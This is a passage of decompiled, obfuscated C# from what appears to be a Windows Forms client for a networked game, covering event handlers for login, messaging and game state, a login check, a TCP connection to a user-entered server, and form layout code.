          int num3 = 2;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_13;
              case 3:
                goto label_14;
              default:
                num3 = 3;
                continue;
            }
          }
label_7:
          this.PublishComparator(value);
          return;
label_13:
          return;
label_14:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    public event Struct deconnectionEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 3;
        if (true)
          goto label_3;
label_1:
        object obj = this._Params;
        num1 = 2;
label_3:
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              goto label_1;
            case 1:
            case 2:
              goto label_2;
            case 4:
              goto label_5;
            default:
              num1 = 4;
              continue;
          }
        }
label_2:
        bool lockTaken = false;
label_5:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num2 = 2;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_6;
              case 1:
                goto label_12;
              case 3:
                goto label_13;
              default:
                num2 = 3;
                continue;
            }
          }
label_6:
          this.VerifyComparator(value);
          return;
label_12:
          return;
label_13:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 2;
        object obj;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              obj = this._Params;
              int num2 = 3;
              num1 = GetterStrategyConnector.StopInfo() ? num2 : num2;
              continue;
            case 1:
            case 3:
              goto label_1;
            case 4:
              goto label_6;
            default:
              if (!GetterStrategyConnector.StopInfo())
              {
                num1 = 4;
                continue;
              }
              goto case 0;
          }
        }
label_1:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_5;
              case 3:
                goto label_13;
              default:
                num3 = 3;
                continue;
            }
          }
label_7:
          this.ExcludeComparator(value);
          return;
label_5:
          return;
label_13:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    public event Singleton loginEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 3;
        object obj;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              obj = this._Params;
              num1 = 2;
              continue;
            case 1:
            case 2:
              goto label_1;
            case 4:
              goto label_5;
            default:
              num1 = 4;
              continue;
          }
        }
label_1:
        bool lockTaken = false;
label_5:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num2 = 2;
          if (true)
            goto label_7;
label_6:
          this.login += value;
          return;
label_7:
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_6;
              case 1:
                goto label_12;
              case 3:
                goto label_13;
              default:
                num2 = 3;
                continue;
            }
          }
label_12:
          return;
label_13:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 3;
        object obj;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 3:
                goto label_1;
              case 1:
              case 2:
                goto label_2;
              case 4:
                goto label_6;
              default:
                if (!GetterStrategyConnector.StopInfo())
                {
                  num2 = 4;
                  continue;
                }
                goto label_6;
            }
          }
label_1:
          obj = this._Params;
          num1 = 2;
        }
label_2:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_13;
              case 3:
                goto label_14;
              default:
                num3 = 3;
                continue;
            }
          }
label_7:
          this.login -= value;
          return;
label_13:
          return;
label_14:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    public event AnnotationValueFilter abortEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 2;
        if (true)
          goto label_3;
label_1:
        bool lockTaken = false;
        goto label_6;
label_3:
        object obj;
        while (true)
        {
          int num2;
          switch (num1)
          {
            case 0:
            case 2:
              obj = this._Params;
              num2 = 3;
              break;
            case 1:
            case 3:
              goto label_1;
            case 4:
              goto label_6;
            default:
              num2 = 4;
              break;
          }
          num1 = num2;
        }
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_14;
              case 3:
                goto label_15;
              default:
                if (GetterStrategyConnector.NewInfo())
                {
                  num3 = 3;
                  continue;
                }
                goto label_10;
            }
          }
label_7:
          this.CloneComparator(value);
          return;
label_14:
          return;
label_15:
          return;
label_10:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 3;
        object obj;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 3:
                obj = this._Params;
                if (!GetterStrategyConnector.StopInfo())
                {
                  num2 = 2;
                  continue;
                }
                goto label_2;
              case 1:
              case 2:
                goto label_2;
              case 4:
                goto label_6;
              default:
                goto label_5;
            }
          }
label_5:
          num1 = 4;
        }
label_2:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          if (GetterStrategyConnector.StopInfo())
            ;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_8;
              case 1:
                goto label_7;
              case 3:
                goto label_16;
              default:
                if (GetterStrategyConnector.NewInfo())
                {
                  num3 = 3;
                  continue;
                }
                goto label_11;
            }
          }
label_8:
          this.CancelComparator(value);
          return;
label_7:
          return;
label_16:
          return;
label_11:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    public event InvocationSchemaObject requestEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 3;
        object obj;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              obj = this._Params;
              num1 = 2;
              continue;
            case 1:
            case 2:
              goto label_1;
            case 4:
              goto label_5;
            default:
              num1 = 4;
              continue;
          }
        }
label_1:
        bool lockTaken = false;
label_5:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num2 = 2;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_6;
              case 1:
                goto label_12;
              case 3:
                goto label_13;
              default:
                num2 = 3;
                continue;
            }
          }
label_6:
          this.LogoutComparator(value);
          return;
label_12:
          return;
label_13:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 2;
        object obj;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                obj = this._Params;
                if (true)
                {
                  num2 = 3;
                  continue;
                }
                goto label_2;
              case 1:
              case 3:
                goto label_2;
              case 4:
                goto label_6;
              default:
                goto label_5;
            }
          }
label_5:
          num1 = 4;
        }
label_2:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_14;
              case 3:
                goto label_15;
              default:
                num3 = 3;
                continue;
            }
          }
label_7:
          this.QueryComparator(value);
          return;
label_14:
          return;
label_15:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    public event FacadeStubPolicy responseEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 2;
        object obj;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_1;
              case 1:
              case 3:
                goto label_2;
              case 4:
                goto label_6;
              default:
                num2 = 4;
                continue;
            }
          }
label_1:
          obj = this._Params;
          num1 = 3;
        }
label_2:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          if (!GetterStrategyConnector.StopInfo())
            goto label_8;
label_7:
          this.InvokeComparator(value);
          return;
label_8:
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_13;
              case 3:
                goto label_14;
              default:
                num3 = 3;
                continue;
            }
          }
label_13:
          return;
label_14:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 3;
        object obj;
        while (true)
        {
          int num2;
          switch (num1)
          {
            case 0:
            case 3:
              obj = this._Params;
              num2 = 2;
              break;
            case 1:
            case 2:
              goto label_1;
            case 4:
              goto label_6;
            default:
              num2 = 4;
              break;
          }
          num1 = num2;
        }
label_1:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          if (GetterStrategyConnector.NewInfo())
            goto label_8;
label_7:
          this.ManageComparator(value);
          return;
label_8:
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_13;
              case 3:
                goto label_14;
              default:
                num3 = 3;
                continue;
            }
          }
label_13:
          return;
label_14:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    public event Rule quitGameEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 2;
        object obj;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_1;
              case 1:
              case 3:
                goto label_2;
              case 4:
                goto label_6;
              default:
                if (!GetterStrategyConnector.StopInfo())
                {
                  num2 = 4;
                  continue;
                }
                goto label_6;
            }
          }
label_1:
          obj = this._Params;
          num1 = 3;
        }
label_2:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_13;
              case 3:
                goto label_14;
              default:
                num3 = 3;
                continue;
            }
          }
label_7:
          this.ValidateComparator(value);
          return;
label_13:
          return;
label_14:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 3;
        object obj;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              obj = this._Params;
              num1 = 2;
              continue;
            case 1:
            case 2:
              goto label_1;
            case 4:
              goto label_5;
            default:
              num1 = 4;
              continue;
          }
        }
label_1:
        bool lockTaken = false;
label_5:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num2 = 2;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_6;
              case 1:
                goto label_12;
              case 3:
                goto label_13;
              default:
                num2 = 3;
                continue;
            }
          }
label_6:
          this.RevertComparator(value);
          return;
label_12:
          return;
label_13:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    public event Interpreter endGameEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 3;
        object obj;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              obj = this._Params;
              num1 = 2;
              continue;
            case 1:
            case 2:
              goto label_2;
            case 4:
              goto label_5;
            default:
              num1 = 4;
              continue;
          }
        }
label_2:
        bool lockTaken = false;
label_5:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num2 = 2;
          if (true)
            goto label_7;
label_6:
          this.SearchVisitor(value);
          return;
label_7:
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_6;
              case 1:
                goto label_12;
              case 3:
                goto label_13;
              default:
                num2 = 3;
                continue;
            }
          }
label_12:
          return;
label_13:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 2;
        object obj;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              obj = this._Params;
              num1 = 3;
              continue;
            case 1:
            case 3:
              goto label_1;
            case 4:
              goto label_5;
            default:
              num1 = 4;
              continue;
          }
        }
label_1:
        bool lockTaken = false;
label_5:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num2 = 2;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_6;
              case 1:
                goto label_12;
              case 3:
                goto label_13;
              default:
                num2 = 3;
                continue;
            }
          }
label_6:
          this.ReflectVisitor(value);
          return;
label_12:
          return;
label_13:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    public event Thread sendMsgEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 2;
        if (true)
          goto label_3;
label_1:
        object obj = this._Params;
        num1 = 3;
label_3:
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
            case 3:
              goto label_2;
            case 4:
              goto label_5;
            default:
              if (true)
              {
                num1 = 4;
                continue;
              }
              goto label_5;
          }
        }
label_2:
        bool lockTaken = false;
label_5:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num2 = 2;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_6;
              case 1:
                goto label_12;
              case 3:
                goto label_13;
              default:
                num2 = 3;
                continue;
            }
          }
label_6:
          this.MoveVisitor(value);
          return;
label_12:
          return;
label_13:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 2;
        if (true)
          goto label_3;
label_1:
        object obj = this._Params;
        if (true)
        {
          num1 = 3;
          goto label_3;
        }
label_2:
        bool lockTaken = false;
        goto label_5;
label_3:
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
            case 3:
              goto label_2;
            case 4:
              goto label_5;
            default:
              num1 = 4;
              continue;
          }
        }
label_5:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num2 = 2;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_6;
              case 1:
                goto label_13;
              case 3:
                goto label_14;
              default:
                num2 = 3;
                continue;
            }
          }
label_6:
          this.CollectVisitor(value);
          return;
label_13:
          return;
label_14:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    public event AuthenticationValueFilter gameEvent
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num1 = 2;
        object obj;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_5;
              case 1:
              case 3:
                goto label_1;
              case 4:
                goto label_6;
              default:
                num2 = 4;
                continue;
            }
          }
label_5:
          obj = this._Params;
          num1 = 3;
        }
label_1:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          if (true)
            goto label_8;
label_7:
          this.ChangeVisitor(value);
          return;
label_8:
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_10;
              case 3:
                goto label_14;
              default:
                int num4 = 3;
                num3 = GetterStrategyConnector.StopInfo() ? num4 : num4;
                continue;
            }
          }
label_10:
          return;
label_14:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 3;
        if (GetterStrategyConnector.NewInfo())
          goto label_4;
label_1:
        object obj = this._Params;
        int num2 = 2;
        num1 = GetterStrategyConnector.StopInfo() ? num2 : num2;
label_4:
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              goto label_1;
            case 1:
            case 2:
              goto label_3;
            case 4:
              goto label_6;
            default:
              num1 = 4;
              continue;
          }
        }
label_3:
        bool lockTaken = false;
label_6:
        try
        {
          Monitor.Enter(obj, ref lockTaken);
          int num3 = 2;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 2:
                goto label_7;
              case 1:
                goto label_2;
              case 3:
                goto label_13;
              default:
                num3 = 3;
                continue;
            }
          }
label_7:
          this.FlushVisitor(value);
          return;
label_2:
          return;
label_13:;
        }
        finally
        {
          if (lockTaken)
            Monitor.Exit(obj);
        }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ConcatComparator(bool isreference)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 0:
            case 4:
              if (this._Listener.Text.Length <= 2)
                break;
              goto label_23;
            case 1:
              if (!this._Listener.Text.Contains<char>(' '))
              {
                num2 = 6;
                continue;
              }
              break;
            case 2:
              goto label_2;
            case 3:
            case 7:
              goto label_11;
            case 5:
              goto label_1;
            case 6:
              if (!this._Listener.Text.StartsWith(RoleValueFilter.RestartVisitor(728)))
              {
                num3 = this._Listener.Text.Length < 20 ? 1 : 0;
                goto label_7;
              }
              else
                break;
            case 8:
              goto label_21;
            case 9:
              goto label_15;
            case 10:
              goto label_9;
            case 11:
              goto label_24;
            default:
              goto label_20;
          }
          num3 = 0;
label_7:
          if (num3 != 0)
          {
            if (true)
              num2 = 7;
            else
              goto label_9;
          }
          else
            goto label_10;
        }
label_1:
        PoolFieldMessage user;
        // ISSUE: reference to a compiler-generated field
        this.m_Message(user, isreference, this.watcher.Checked && this.m_Service.Visible);
        this.InterruptComparator();
        num1 = 2;
        continue;
label_10:
        this.log((BehaviorAccumulateValues) 2, RoleValueFilter.RestartVisitor(3072));
        num1 = 11;
        continue;
label_11:
        if (this._Printer.Text.Length > 2)
        {
          num1 = 9;
          continue;
        }
        int num4 = 0;
        goto label_17;
label_15:
        num4 = this._Printer.Text.Length < 20 ? 1 : 0;
label_17:
        if (num4 == 0)
        {
          this.log((BehaviorAccumulateValues) 2, RoleValueFilter.RestartVisitor(3002));
          num1 = 10;
          continue;
        }
        goto label_21;
label_20:
        num1 = 8;
        continue;
label_21:
        user = new PoolFieldMessage(this._Listener.Text, this._Printer.Text);
        num1 = 5;
        continue;
label_23:
        num1 = 1;
      }
label_9:
      return;
label_2:
      return;
label_24:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected virtual void draw()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected virtual void reset()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected virtual void setLastMove(object v, int counter_end)
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected virtual SqlParameterType updateMove() => (SqlParameterType) 3;

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected void ReadComparator(int meanitem) => this._FieldComparator.Interval = meanitem;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CountComparator(object first, EventArgs selection)
    {
      int num1 = 4;
      while (true)
      {
        string pattern;
        Match match;
        int num2;
        bool success;
        switch (num1)
        {
          case 0:
          case 4:
            pattern = RoleValueFilter.RestartVisitor(3204);
            num2 = 2;
            break;
          case 1:
          case 2:
            match = Regex.Match(this.m_Product.Text, pattern);
            num2 = 3;
            break;
          case 3:
            success = match.Success;
            goto case 5;
          case 5:
            if (success)
            {
              num2 = 6;
              break;
            }
            goto label_15;
          case 6:
            goto label_9;
          default:
            if (true)
            {
              num1 = 5;
              continue;
            }
            goto label_9;
        }
        num1 = num2;
      }
label_15:
      return;
label_9:
      try
      {
        TcpClient tcpclient = new TcpClient(this.m_Product.Text, (int) this.global.Value);
        int num3 = 2;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 2:
              // ISSUE: reference to a compiler-generated field
              this._Invocation(tcpclient);
              goto case 1;
            case 1:
            case 3:
              this.InterruptComparator();
              num3 = 4;
              continue;
            case 4:
              goto label_17;
            default:
              num3 = 3;
              continue;
          }
        }
      }
      catch (Exception ex)
      {
        this.log((BehaviorAccumulateValues) 2, RoleValueFilter.RestartVisitor(3366) + ex.Message);
      }
label_17:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RestartComparator(object param, EventArgs cust)
    {
      // ISSUE: reference to a compiler-generated field
      this._Iterator();
      this.GetComparator();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RateComparator(object init, EventArgs vis) => this.ConcatComparator(false);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RemoveComparator(object info, EventArgs second) => this.ConcatComparator(true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void TestComparator(object task, EventArgs col)
    {
      this.CallComparator();
      // ISSUE: reference to a compiler-generated field
      this._System();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ComputeComparator(object asset, EventArgs map) => this.printCSMessage(new KeyValuePair<BehaviorAccumulateValues, string>((BehaviorAccumulateValues) 0, RoleValueFilter.RestartVisitor(3400)));

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DeleteComparator(object key, EventArgs visitor)
    {
      int num1 = 3;
      while (true)
      {
        PoolFieldMessage user;
        int num2;
        switch (num1)
        {
          case 0:
          case 3:
            user = new PoolFieldMessage(this._Setter.Text);
            num2 = 2;
            break;
          case 1:
          case 2:
            this._Setter.Text = RoleValueFilter.RestartVisitor(2624);
            num2 = 5;
            break;
          case 4:
            // ISSUE: reference to a compiler-generated field
            this.m_Tokenizer(user, true);
            num2 = 6;
            break;
          case 5:
            this.specification.Enabled = false;
            goto case 4;
          case 6:
            goto label_8;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PatchComparator(object reference, FormClosingEventArgs pol)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_1;
            case 1:
            case 4:
              goto label_3;
            case 2:
            case 3:
              goto label_2;
            case 5:
              goto label_8;
            default:
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_8;
          }
        }
label_1:
        bool flag = this.config != 0;
        num1 = 4;
        continue;
label_2:
        // ISSUE: reference to a compiler-generated field
        this._Iterator();
        num1 = 5;
        continue;
label_3:
        if (!flag)
          break;
        goto label_2;
      }
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PopComparator(object v, DataGridViewCellEventArgs counter)
    {
      int num1 = 3;
      if (GetterStrategyConnector.NewInfo())
        goto label_14;
label_1:
      bool flag1 = counter.ColumnIndex == 1;
      if (true)
      {
        num1 = 9;
        goto label_14;
      }
label_2:
      bool flag2;
      int num2;
      if (flag2)
      {
        num2 = 10;
        goto label_13;
      }
label_11:
      this.m_Mapper.Rows.RemoveAt(counter.RowIndex);
      if (GetterStrategyConnector.NewInfo())
      {
        num1 = 11;
        goto label_14;
      }
label_12:
      PoolFieldMessage user;
      // ISSUE: reference to a compiler-generated field
      this.account(user);
      goto label_11;
label_13:
      num1 = num2;
label_14:
      string setup;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_10;
          case 2:
          case 4:
            goto label_12;
          case 3:
            setup = this.m_Mapper.Rows[counter.RowIndex].Cells[0].Value.ToString();
            if (true)
            {
              num1 = 5;
              continue;
            }
            goto label_10;
          case 5:
            user = new PoolFieldMessage(setup);
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto label_17;
          case 6:
            goto label_2;
          case 7:
          case 10:
            // ISSUE: reference to a compiler-generated field
            this.m_Tokenizer(user, false);
            int num3 = 1;
            num1 = GetterStrategyConnector.StopInfo() ? num3 : num3;
            continue;
          case 8:
            goto label_11;
          case 9:
            goto label_7;
          case 11:
            goto label_5;
          default:
            if (true)
            {
              num1 = 8;
              continue;
            }
            goto case 5;
        }
      }
label_7:
      while (!flag1)
      {
        flag2 = counter.ColumnIndex == 2;
        if (GetterStrategyConnector.NewInfo())
        {
          num1 = 6;
          goto label_14;
        }
      }
      num2 = 2;
      goto label_13;
label_10:
      goto label_11;
label_5:
      return;
label_17:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ForgotComparator(object item, DataGridViewCellEventArgs second)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        string str;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_6;
            case 1:
              flag = !this.CalcComparator(str);
              num2 = 0;
              continue;
            case 3:
            case 6:
              goto label_8;
            case 4:
              str = this.m_Exception.Rows[second.RowIndex].Cells[0].Value.ToString();
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto label_5;
            case 5:
              goto label_5;
            case 7:
              goto label_3;
            case 8:
              goto label_2;
            case 9:
              goto label_12;
            default:
              goto label_11;
          }
        }
label_2:
        PoolFieldMessage user;
        // ISSUE: reference to a compiler-generated field
        this.m_Filter(user);
        num1 = 9;
        continue;
label_3:
        this._Setter.Text = str;
        num1 = 5;
        continue;
label_5:
        this.specification.Enabled = true;
        num1 = 8;
        continue;
label_6:
        if (flag)
        {
          num1 = 6;
          continue;
        }
        break;
label_8:
        user = new PoolFieldMessage(str);
        goto label_3;
label_11:
        num1 = 7;
      }
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void UpdateComparator(object i, EventArgs vis)
    {
      int num = 4;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            this.InitComparator(this.m_Candidate, this.m_ValueComparator.Text);
            num = 3;
            continue;
          case 1:
          case 3:
            // ISSUE: reference to a compiler-generated field
            this.customer(this.m_ValueComparator.Text);
            goto case 2;
          case 2:
            this.m_ValueComparator.Text = "";
            num = 5;
            continue;
          case 5:
            goto label_6;
          default:
            num = 2;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CreateComparator(object last, EventArgs col) => this.regComparator.Clear();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CalculateComparator(object spec, EventArgs counter)
    {
      int num1 = 6;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              this.draw();
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 5;
                continue;
              }
              goto label_13;
            case 1:
              goto label_7;
            case 2:
              goto label_8;
            case 3:
            case 4:
              goto label_3;
            case 5:
              this._Utils += this._FieldComparator.Interval;
              if (true)
              {
                num2 = 8;
                continue;
              }
              goto case 0;
            case 7:
              goto label_1;
            case 8:
              goto label_10;
            case 9:
              goto label_9;
            case 10:
              goto label_13;
            default:
              goto label_6;
          }
        }
label_1:
        bool flag;
        if (flag)
        {
          num1 = 3;
          continue;
        }
        break;
label_3:
        this._Utils = 0;
        goto label_8;
label_6:
        num1 = 2;
        continue;
label_7:
        this._FieldComparator.Stop();
        num1 = 9;
        continue;
label_8:
        this._Broadcaster.Enabled = true;
        num1 = 1;
        continue;
label_9:
        this.PushComparator();
        num1 = 10;
        continue;
label_10:
        flag = this._Utils >= this.m_Ref;
        num1 = 7;
      }
      return;
label_13:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool isi)
    {
      int num1 = 3;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            goto label_8;
          case 1:
          case 4:
            num3 = this._Tests != null ? 1 : 0;
            goto label_11;
          case 2:
          case 5:
            this._Tests.Dispose();
            goto case 0;
          case 3:
            if (isi)
            {
              if (true)
              {
                num1 = 4;
                continue;
              }
              goto case 2;
            }
            else
            {
              num3 = 0;
              goto label_11;
            }
          case 6:
            goto label_13;
          default:
            num2 = 0;
            break;
        }
label_4:
        num1 = num2;
        continue;
label_8:
        base.Dispose(isi);
        num2 = 6;
        goto label_4;
label_11:
        if (num3 != 0)
        {
          num2 = 5;
          goto label_4;
        }
        else
          goto label_8;
      }
label_13:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PostComparator()
    {
      int num1 = 164;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              this._Task.Name = RoleValueFilter.RestartVisitor(5124);
              this._Task.Size = new Size(26, 13);
              num2 = 43;
              continue;
            case 1:
              this.schemaComparator.Text = RoleValueFilter.RestartVisitor(5604);
              num2 = 93;
              continue;
            case 2:
              this.dic.SuspendLayout();
              num2 = 11;
              continue;
            case 3:
              goto label_187;
            case 4:
              this.dic.Controls.Add((Control) this.m_Expression);
              if (!GetterStrategyConnector.StopInfo())
              {
                num2 = 81;
                continue;
              }
              goto label_208;
            case 5:
            case 170:
              this.m_Service = new Button();
              num2 = 27;
              continue;
            case 6:
              goto label_18;
            case 7:
              goto label_89;
            case 8:
              goto label_165;
            case 9:
              goto label_54;
            case 10:
              goto label_142;
            case 11:
              this.global.BeginInit();
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 273;
                continue;
              }
              goto case 152;
            case 12:
              this.importer.Name = RoleValueFilter.RestartVisitor(4796);
              num2 = 19;
              continue;
            case 13:
              this._Task.Text = RoleValueFilter.RestartVisitor(5140);
              this.m_Initializer.Controls.Add((Control) this._Code);
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto case 261;
            case 14:
              this._Getter = new ToolStripStatusLabel();
              if (true)
              {
                num2 = 258;
                continue;
              }
              goto label_142;
            case 15:
              this.m_Composer.TabIndex = 2;
              if (GetterStrategyConnector.NewInfo())
              {
                num2 = 145;
                continue;
              }
              goto label_221;
            case 16:
              goto label_118;
            case 17:
              this.ClientSize = new Size(712, 557);
              this.Controls.Add((Control) this.stubComparator);
              this.Controls.Add((Control) this._Base);
              num2 = 243;
              continue;
            case 18:
              goto label_199;
            case 19:
              goto label_105;
            case 20:
              this._ComparatorComparator.Width = 60;
